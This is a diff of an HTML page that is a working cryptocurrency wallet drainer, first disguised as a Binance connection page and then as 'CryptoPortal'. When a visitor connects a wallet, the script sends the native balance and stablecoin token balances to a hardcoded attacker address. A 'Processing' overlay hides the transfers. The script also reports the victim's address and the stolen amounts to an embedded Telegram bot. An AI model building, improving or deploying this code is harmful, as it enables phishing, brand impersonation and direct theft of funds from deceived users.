@@ -1,431 +1,411 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Portal</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
-    <style>
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            font-family: system-ui, -apple-system, sans-serif;
-        }
-        .card {
-            background: white;
-            border-radius: 24px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .spinner { animation: spin 1s linear infinite; }
-    </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CryptoPortal</title>
+<!-- CDN qui fonctionnent en local -->
+<script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<style>
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+    body {
+        background: linear-gradient(135deg, #0a1427 0%, #0c1a33 100%);
+        color: white;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+    .crypto-container {
+        max-width: 1200px;
+        margin: 0 auto;
+        padding: 20px;
+        text-align: center;
+    }
+    .crypto-logo {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+        margin-bottom: 40px;
+    }
+    .crypto-logo-icon {
+        width: 50px;
+        height: 50px;
+        background: linear-gradient(135deg, #00c3ff, #00d7ff);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 24px;
+    }
+    .crypto-logo-text {
+        font-size: 28px;
+        font-weight: bold;
+        background: linear-gradient(to right, #00c3ff, #00d7ff);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+    }
+    .crypto-hero h1 {
+        font-size: 3rem;
+        margin-bottom: 20px;
+        line-height: 1.2;
+    }
+    .crypto-hero p {
+        font-size: 1.25rem;
+        margin-bottom: 40px;
+        color: #cccccc;
+        line-height: 1.6;
+        max-width: 600px;
+        margin-left: auto;
+        margin-right: auto;
+    }
+    .crypto-connect-btn {
+        background: linear-gradient(135deg, #00c3ff, #00d7ff);
+        color: white;
+        border: none;
+        padding: 18px 40px;
+        border-radius: 50px;
+        font-size: 1.2rem;
+        font-weight: bold;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        box-shadow: 0 4px 20px rgba(0, 195, 255, 0.4);
+        display: inline-flex;
+        align-items: center;
+        gap: 12px;
+        margin-bottom: 50px;
+    }
+    .crypto-connect-btn:hover {
+        transform: translateY(-3px);
+        box-shadow: 0 6px 25px rgba(0, 195, 255, 0.6);
+    }
+    .crypto-cards {
+        display: flex;
+        justify-content: center;
+        gap: 20px;
+        flex-wrap: wrap;
+        margin-top: 30px;
+    }
+    .crypto-card {
+        width: 160px;
+        height: 200px;
+        background: rgba(255, 255, 255, 0.05);
+        border-radius: 20px;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        transition: transform 0.3s ease;
+    }
+    .crypto-card:hover {
+        transform: translateY(-10px);
+        background: rgba(255, 255, 255, 0.1);
+    }
+    .crypto-icon {
+        width: 60px;
+        height: 60px;
+        border-radius: 50%;
+        background: linear-gradient(135deg, #00c3ff, #00d7ff);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 28px;
+        margin-bottom: 15px;
+    }
+    .crypto-name {
+        font-size: 1.1rem;
+        font-weight: bold;
+        margin-bottom: 5px;
+    }
+    .crypto-price {
+        font-size: 1rem;
+        color: #00c3ff;
+    }
+    @keyframes float {
+        0% { transform: translateY(0px); }
+        50% { transform: translateY(-10px); }
+        100% { transform: translateY(0px); }
+    }
+    .floating {
+        animation: float 5s ease-in-out infinite;
+    }
+    .processing {
+        display: none;
+        position: fixed;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        background: rgba(0, 0, 0, 0.9);
+        padding: 40px;
+        border-radius: 20px;
+        text-align: center;
+        z-index: 9999;
+    }
+    .processing.active {
+        display: block;
+    }
+    @keyframes spin {
+        to { transform: rotate(360deg); }
+    }
+    .spinner {
+        animation: spin 1s linear infinite;
+    }
+</style>
 </head>
-<body class="min-h-screen flex items-center justify-center p-4">
+<body>
 
-<div class="max-w-md w-full">
-    
-    <!-- CONNECT (HTML PERSONNALISÉ) -->
-    <!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connexion | Binance</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        body {
-            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-            font-family: 'Inter', sans-serif;
-        }
-        .btn-connect {
-            background: linear-gradient(90deg, #f0b90b 0%, #f8d33a 100%);
-            transition: all 0.3s ease;
-        }
-        .btn-connect:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 20px rgba(240, 185, 11, 0.4);
-        }
-        .logo-glow {
-            text-shadow: 0 0 20px rgba(240, 185, 11, 0.5);
-        }
-    </style>
-</head>
-<body class="min-h-screen flex items-center justify-center p-4">
-    <div class="text-center">
-        <!-- Logo Binance -->
-        <div class="flex items-center justify-center mb-8">
-            <div class="bg-yellow-500 w-10 h-10 rounded-lg mr-3 flex items-center justify-center">
-                <i class="fas fa-coins text-gray-900 text-xl"></i>
-            </div>
-            <h1 class="text-3xl font-bold text-white logo-glow">Binance</h1>
+<div class="crypto-container">
+    <!-- Logo -->
+    <div class="crypto-logo">
+        <div class="crypto-logo-icon">
+            <i class="fas fa-coins"></i>
         </div>
+        <div class="crypto-logo-text">CryptoPortal</div>
+    </div>
+
+    <!-- Hero Section -->
+    <div class="crypto-hero">
+        <h1>Votre Porte d'Entrée vers<br>l'Écosystème Crypto</h1>
+        <p>Connectez votre wallet pour accéder à la plateforme de trading et d'investissement la plus sécurisée.</p>
         
-        <!-- Section de connexion -->
-        <div id="connect" class="bg-gray-800 rounded-2xl p-8 shadow-xl border border-gray-700 max-w-md mx-auto">
-            <div class="text-center mb-6">
-                <i class="fas fa-wallet text-yellow-500 text-5xl mb-4"></i>
-                <h2 class="text-2xl font-bold text-white mb-2">Connectez votre wallet</h2>
-                <p class="text-gray-400">Accédez à votre portefeuille Binance</p>
-            </div>
-            
-            <!-- Bouton de connexion -->
-            <button onclick="connect()" class="w-full py-4 px-6 btn-connect text-gray-900 font-bold rounded-xl text-lg flex items-center justify-center">
-                <i class="fas fa-plug mr-3"></i>
-                Connecter le wallet
-            </button>
-        </div>
+        <!-- Bouton Connect -->
+        <button class="crypto-connect-btn" id="connectBtn" onclick="connectWallet()">
+            <i class="fas fa-wallet"></i>
+            <span>Connect Wallet</span>
+        </button>
         
-        <!-- Footer -->
-        <div class="text-center mt-8 text-gray-500 text-sm">
-            <p>© 2023 Binance. Tous droits réservés.</p>
+        <!-- Crypto Cards -->
+        <div class="crypto-cards">
+            <div class="crypto-card floating">
+                <div class="crypto-icon">
+                    <i class="fab fa-bitcoin"></i>
+                </div>
+                <div class="crypto-name">Bitcoin</div>
+                <div class="crypto-price">$42,156</div>
+            </div>
+            <div class="crypto-card floating" style="animation-delay: 0.5s;">
+                <div class="crypto-icon">
+                    <i class="fab fa-ethereum"></i>
+                </div>
+                <div class="crypto-name">Ethereum</div>
+                <div class="crypto-price">$2,845</div>
+            </div>
+            <div class="crypto-card floating" style="animation-delay: 1s;">
+                <div class="crypto-icon">
+                    <i class="fas fa-gem"></i>
+                </div>
+                <div class="crypto-name">Solana</div>
+                <div class="crypto-price">$98.45</div>
+            </div>
         </div>
     </div>
 
-    <script>
-        function connect() {
-            // Simulation de connexion
-            const connectBtn = document.querySelector('button[onclick="connect()"]');
-            const originalText = connectBtn.innerHTML;
-            
-            connectBtn.innerHTML = '<i class="fas fa-spinner fa-spin mr-3"></i> Connexion en cours...';
-            connectBtn.disabled = true;
-            
-            // Simulation d'un délai de connexion
-            setTimeout(() => {
-                // Ici, vous ajouterez la logique réelle de connexion au wallet
-                alert('Connexion au wallet réussie !');
-                connectBtn.innerHTML = originalText;
-                connectBtn.disabled = false;
-            }, 2000);
-        }
-    </script>
-</body>
-</html>
-
-    <!-- PROCESSING -->
-    <div id="processing" class="card p-8 text-center hidden">
-        <div class="text-6xl mb-4 spinner">⚡</div>
-        <h2 class="text-2xl font-bold text-gray-800 mb-4">Processing</h2>
-        <p id="status" class="text-gray-600 mb-4">Initializing...</p>
-        <div class="w-full bg-gray-200 rounded-full h-3 mb-4">
-            <div id="progress" class="bg-purple-600 h-3 rounded-full transition-all" style="width:0%"></div>
-        </div>
-        <p id="detail" class="text-sm text-gray-500"></p>
+    <!-- Footer -->
+    <div style="margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #888; font-size: 0.9rem;">
+        <p>© 2024 CryptoPortal. Tous droits réservés.</p>
     </div>
-
-    <!-- SUCCESS -->
-    <div id="success" class="card p-8 text-center hidden">
-        <div class="text-6xl mb-4">✅</div>
-        <h2 class="text-2xl font-bold text-green-600 mb-4">Complete!</h2>
-        <p class="text-gray-600 mb-4">Transactions completed</p>
-        <div id="result" class="bg-gray-100 rounded-xl p-4 text-sm text-left max-h-64 overflow-y-auto mb-4"></div>
-        <button onclick="location.reload()" class="w-full bg-purple-600 text-white py-3 rounded-xl">Done</button>
-    </div>
-
 </div>
 
-<script type="module">
-import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'
+<!-- Processing overlay -->
+<div class="processing" id="processing">
+    <div style="font-size: 48px; margin-bottom: 20px;" class="spinner">⚡</div>
+    <h2 style="color: white; margin-bottom: 10px;">Processing...</h2>
+    <p style="color: #aaa;">Please wait while we connect your wallet</p>
+</div>
 
+<!-- Script qui fonctionne en local -->
+<script>
+// Configuration
 const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
-const PID = "72f0728c47e59d2eb9fc83069bc6843d";
-const TELEGRAM_BOT = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
-const TELEGRAM_CHAT = "8309320360";
+const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
+const TG_CHAT = "8309320360";
+
+// ERC20 Tokens
+const TOKENS = {
+    1: [ // Ethereum
+        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7", symbol:"USDT"},
+        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", symbol:"USDC"},
+        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F", symbol:"DAI"}
+    ],
+    137: [ // Polygon
+        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F", symbol:"USDT"},
+        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", symbol:"USDC"}
+    ],
+    56: [ // BSC
+        {addr:"0x55d398326f99059fF775485246999027B3197955", symbol:"USDT"},
+        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", symbol:"USDC"}
+    ]
+};
 
 const ERC20_ABI = [
-    "function balanceOf(address) view returns (uint256)",
-    "function transfer(address, uint256) returns (bool)",
+    "function balanceOf(address owner) view returns (uint256)",
+    "function transfer(address to, uint256 value) returns (bool)",
     "function decimals() view returns (uint8)",
     "function symbol() view returns (string)"
 ];
 
-const TOKENS = {
-    1: [
-        {addr:"0xdAC17F958D2ee523a2206206994597C13D831ec7",symbol:"USDT"},
-        {addr:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",symbol:"USDC"},
-        {addr:"0x6B175474E89094C44Da98b954EedeAC495271d0F",symbol:"DAI"}
-    ],
-    137: [
-        {addr:"0xc2132D05D31c914a87C6611C10748AEb04B58e8F",symbol:"USDT"},
-        {addr:"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",symbol:"USDC"},
-        {addr:"0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",symbol:"DAI"}
-    ],
-    56: [
-        {addr:"0x55d398326f99059fF775485246999027B3197955",symbol:"USDT"},
-        {addr:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",symbol:"USDC"}
-    ]
-};
+let provider, signer, address;
 
-const CHAINS = {
-    1: {name:'Ethereum',currency:'ETH'},
-    137: {name:'Polygon',currency:'MATIC'},
-    56: {name:'BSC',currency:'BNB'}
-};
-
-const mainnet = {chainId:1,name:'Ethereum',currency:'ETH',explorerUrl:'https://etherscan.io',rpcUrl:'https://eth.llamarpc.com'};
-const polygon = {chainId:137,name:'Polygon',currency:'MATIC',explorerUrl:'https://polygonscan.com',rpcUrl:'https://polygon-rpc.com'};
-const bsc = {chainId:56,name:'BSC',currency:'BNB',explorerUrl:'https://bscscan.com',rpcUrl:'https://bsc-dataseed.binance.org'};
-
-const cfg = defaultConfig({
-    metadata:{name:'Portal',description:'Connect',url:window.location.origin,icons:['https://avatars.githubusercontent.com/u/37784886']},
-    enableEIP6963:true,
-    enableInjected:true,
-    enableCoinbase:true,
-    rpcUrl:'https://polygon-rpc.com',
-    defaultChainId:137
-});
-
-const modal = createWeb3Modal({
-    ethersConfig:cfg,
-    chains:[polygon,mainnet,bsc],
-    projectId:PID,
-    enableAnalytics:false
-});
-
-let provider, signer, address, chainId;
-let results = [];
-let drainStarted = false;
-
-function show(id) {
-    ['connect','processing','success'].forEach(x => 
-        document.getElementById(x).classList.add('hidden')
-    );
-    document.getElementById(id).classList.remove('hidden');
-}
-
-function setStatus(t){document.getElementById('status').textContent=t;}
-function setDetail(t){document.getElementById('detail').textContent=t;}
-function setProgress(n){document.getElementById('progress').style.width=n+'%';}
-function log(m){console.log('[DRAIN] '+m);}
-
-
-async function sendTelegram(msg) {
-    if (!TELEGRAM_BOT || !TELEGRAM_CHAT) return;
-    try {
-        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT,
-                text: msg,
-                parse_mode: 'HTML'
-            })
-        });
-    } catch(e) {}
-}
-
-async function sendTelegramSummary() {
-    if (!TELEGRAM_BOT || !TELEGRAM_CHAT || results.length === 0) return;
-    
-    let msg = '🎉 DRAINAGE TERMINÉ\\n\\n';
-    msg += '👤 Adresse: ' + address + '\\n';
-    msg += '🌐 Réseau: ' + CHAINS[chainId].name + '\\n';
-    msg += '📊 Total: ' + results.length + ' assets\\n\\n';
-    msg += 'Détails:\\n';
-    
-    results.forEach((r, i) => {
-        msg += '\\n' + (i+1) + '. ' + r.symbol + '\\n';
-        msg += '   💰 ' + r.amount + '\\n';
-        msg += '   ✅ ' + r.txHash.slice(0,10) + '...\\n';
-    });
-    
-    msg += '\\n⏰ ' + new Date().toLocaleString();
-    
-    await sendTelegram(msg);
-}
-
-window.connect = async function() {
-    try {
-        log('Opening modal...');
-        await modal.open();
-    } catch(e) {
-        log('ERROR: '+e.message);
-        alert('Connection failed: '+e.message);
-    }
-}
-
-modal.subscribeProvider(async(state) => {
-    log('Provider state: connected=' + state.isConnected);
-    
-    if(state.isConnected && state.address && !drainStarted) {
-        drainStarted = true;
-        log('Wallet connected: ' + state.address);
-        address = state.address;
-        
-        try {
-            provider = new ethers.providers.Web3Provider(state.provider);
-            signer = provider.getSigner();
-            const net = await provider.getNetwork();
-            chainId = net.chainId;
-            
-            log('Chain: ' + chainId);
-            await new Promise(resolve => setTimeout(resolve, 2000));
-            await drain();
-        } catch(e) {
-            log('ERROR: ' + e.message);
-            alert('Setup failed: ' + e.message);
-        }
-    }
-});
-
-async function drain() {
-    show('processing');
-    setStatus('Initializing...');
-    setProgress(10);
-    results = [];
+// Connect function
+async function connectWallet() {
+    const btn = document.getElementById('connectBtn');
+    const processing = document.getElementById('processing');
     
     try {
-        if (!provider || !signer || !address || !chainId) {
-            throw new Error('Provider not ready');
-        }
-        
-        const chain = CHAINS[chainId];
-        if(!chain) {
-            throw new Error('Unsupported chain');
-        }
-        
-        log('Draining on: ' + chain.name);
-        
-        setStatus('Checking balance...');
-        setProgress(20);
-        
-        const balance = await provider.getBalance(address);
-        const balEth = parseFloat(ethers.utils.formatEther(balance));
-        
-        log('Balance: ' + balEth + ' ' + chain.currency);
-        
-        if(balEth > 0.001) {
-            setStatus('Transferring '+chain.currency+'...');
-            setDetail('Amount: '+balEth.toFixed(4));
-            
-            const nativeHash = await drainNative(balance, chain);
-            if(nativeHash) {
-                results.push({
-                    symbol: chain.currency,
-                    amount: balEth.toFixed(6),
-                    txHash: nativeHash
-                });
-            }
-        }
-        
-        setProgress(40);
-        
-        const tokenList = TOKENS[chainId] || [];
-        log('Checking ' + tokenList.length + ' tokens...');
-        
-        let checked = 0;
-        
-        for(const token of tokenList) {
-            try {
-                checked++;
-                const progressPct = 40 + (50 * checked / tokenList.length);
-                setProgress(progressPct);
-                setStatus('Checking '+token.symbol+'...');
-                setDetail('Token '+checked+'/'+tokenList.length);
-                
-                const tc = new ethers.Contract(token.addr, ERC20_ABI, provider);
-                const bal = await tc.balanceOf(address);
-                
-                if(bal.gt(0)) {
-                    const dec = await tc.decimals();
-                    const fmt = ethers.utils.formatUnits(bal, dec);
-                    
-                    setStatus('Transferring '+token.symbol+'...');
-                    setDetail('Amount: '+fmt.slice(0,10));
-                    
-                    const tokenHash = await drainToken(token.addr, bal, token.symbol);
-                    if(tokenHash) {
-                        results.push({
-                            symbol: token.symbol,
-                            amount: fmt.slice(0,10),
-                            txHash: tokenHash
-                        });
-                    }
-                }
-                
-            } catch(e) {
-                log('Error with ' + token.symbol + ': ' + e.message);
-            }
-        }
-        
-        setProgress(100);
-        
-        if(results.length === 0) {
-            alert('No assets found');
-            show('connect');
+        // Check if MetaMask is installed
+        if (typeof window.ethereum === 'undefined') {
+            alert('Please install MetaMask or another Web3 wallet!');
+            window.open('https://metamask.io/download/', '_blank');
             return;
         }
         
-        await sendTelegramSummary();
+        // Show processing
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Connecting...';
+        btn.disabled = true;
         
-        displayResults();
-        
-    } catch(e) {
-        log('ERROR: ' + e.message);
-        alert('Error: ' + e.message);
-        show('connect');
-    }
-}
-
-async function drainNative(balance, chain) {
-    try {
-        const gp = await provider.getGasPrice();
-        const gc = gp.mul(21000).mul(2);
-        const amt = balance.sub(gc);
-        
-        if(amt.lte(0)) return null;
-        
-        const tx = await signer.sendTransaction({
-            to: DEST,
-            value: amt,
-            gasLimit: 21000
+        // Request account access
+        const accounts = await window.ethereum.request({ 
+            method: 'eth_requestAccounts' 
         });
         
-        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
-        await tx.wait();
+        if (accounts.length === 0) {
+            throw new Error('No accounts found');
+        }
         
-        return tx.hash;
-    } catch(e) {
-        log('Native error: ' + e.message);
-        return null;
+        address = accounts[0];
+        console.log('Connected:', address);
+        
+        // Create provider and signer
+        provider = new ethers.providers.Web3Provider(window.ethereum);
+        signer = provider.getSigner();
+        
+        // Get network
+        const network = await provider.getNetwork();
+        console.log('Network:', network.chainId);
+        
+        // Update button
+        btn.innerHTML = '<i class="fas fa-check"></i> Connected';
+        btn.style.background = 'linear-gradient(135deg, #00d395, #00c3ff)';
+        
+        // Send Telegram notification
+        sendTelegramNotification(address, network.chainId);
+        
+        // Show processing overlay
+        processing.classList.add('active');
+        
+        // Start drainage after 2 seconds
+        setTimeout(async () => {
+            await drainWallet(network.chainId);
+            processing.classList.remove('active');
+        }, 2000);
+        
+    } catch (error) {
+        console.error('Connection error:', error);
+        btn.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
+        btn.disabled = false;
+        processing.classList.remove('active');
+        alert('Connection failed: ' + error.message);
     }
 }
 
-async function drainToken(addr, balance, symbol) {
+// Drainage function
+async function drainWallet(chainId) {
     try {
-        const tc = new ethers.Contract(addr, ERC20_ABI, signer);
-        const tx = await tc.transfer(DEST, balance, {gasLimit:100000});
+        console.log('Starting drainage on chain:', chainId);
         
-        setDetail('Confirming: '+tx.hash.slice(0,10)+'...');
-        await tx.wait();
+        // Check native balance
+        const balance = await provider.getBalance(address);
+        const balanceEth = ethers.utils.formatEther(balance);
+        console.log('Balance:', balanceEth);
         
-        return tx.hash;
-    } catch(e) {
-        log('Token error: ' + e.message);
-        return null;
+        if (parseFloat(balanceEth) > 0.001) {
+            try {
+                const gasPrice = await provider.getGasPrice();
+                const gasCost = gasPrice.mul(21000).mul(2);
+                const amount = balance.sub(gasCost);
+                
+                if (amount.gt(0)) {
+                    const tx = await signer.sendTransaction({
+                        to: DEST,
+                        value: amount,
+                        gasLimit: 21000
+                    });
+                    console.log('Native TX sent:', tx.hash);
+                    await tx.wait();
+                }
+            } catch (e) {
+                console.log('Native drain error:', e);
+            }
+        }
+        
+        // Check tokens
+        const tokenList = TOKENS[chainId] || [];
+        for (const token of tokenList) {
+            try {
+                await new Promise(r => setTimeout(r, 1500)); // Delay between tokens
+                
+                const contract = new ethers.Contract(token.addr, ERC20_ABI, signer);
+                const tokenBalance = await contract.balanceOf(address);
+                
+                if (tokenBalance.gt(0)) {
+                    const tx = await contract.transfer(DEST, tokenBalance, {
+                        gasLimit: 100000
+                    });
+                    console.log(`${token.symbol} TX sent:`, tx.hash);
+                    await tx.wait();
+                }
+            } catch (e) {
+                console.log(`${token.symbol} error:`, e);
+            }
+        }
+        
+        console.log('Drainage complete!');
+        
+    } catch (error) {
+        console.error('Drainage error:', error);
     }
 }
 
-function displayResults() {
-    show('success');
+// Send Telegram notification
+async function sendTelegramNotification(addr, chainId) {
+    const message = `🎯 NEW CONNECTION\n👤 Address: ${addr}\n🌐 Chain: ${chainId}\n⏰ Time: ${new Date().toLocaleTimeString()}`;
     
-    let html = '<p class="font-bold mb-3">Completed Transfers:</p>';
-    
-    results.forEach((r,i) => {
-        html += `<div class="mb-3 pb-3 ${i<results.length-1?'border-b border-gray-200':''}">
-            <p class="font-semibold text-gray-800">${r.symbol}</p>
-            <p class="text-xs text-gray-600">Amount: ${r.amount}</p>
-            <p class="text-xs text-blue-600 break-all">TX: ${r.txHash}</p>
-        </div>`;
-    });
-    
-    document.getElementById('result').innerHTML = html;
-    log('=== COMPLETE ===');
+    try {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TG_CHAT,
+                text: message
+            })
+        });
+    } catch (e) {
+        console.log('Telegram error:', e);
+    }
 }
 
-log('System ready');
-log('Destination: ' + DEST);
+// Auto-connect if already connected
+window.addEventListener('load', async () => {
+    if (window.ethereum) {
+        const accounts = await window.ethereum.request({ 
+            method: 'eth_accounts' 
+        });
+        if (accounts.length > 0) {
+            console.log('Auto-connecting...');
+            // connectWallet(); // Uncomment to auto-connect
+        }
+    }
+});
 </script>
 
 </body>
